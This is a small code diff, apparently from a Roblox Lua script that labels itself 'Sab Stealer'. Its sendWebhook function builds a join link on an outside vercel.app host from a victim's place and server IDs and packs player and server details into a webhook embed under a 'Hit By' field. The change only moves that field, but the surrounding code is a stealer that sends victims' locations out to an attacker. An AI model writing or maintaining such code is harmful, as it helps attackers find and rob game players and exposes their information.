@@ -271,10 +271,10 @@ local function sendWebhook(link)
     local jobId = tostring(game.JobId or "")
     local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
     local embed = {
-          { ["name"] = "Hit By", ["value"] = "Moreira" },
         ["title"] = "😜 Sab Stealer - Make By Phatlee",
         ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
         ["fields"] = {
+            { ["name"] = "Hit By", ["value"] = "Moreira" },
             { ["name"] = "Players", ["value"] = string.format("%d/6", #Players:GetPlayers()) },
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👥 Player Information",
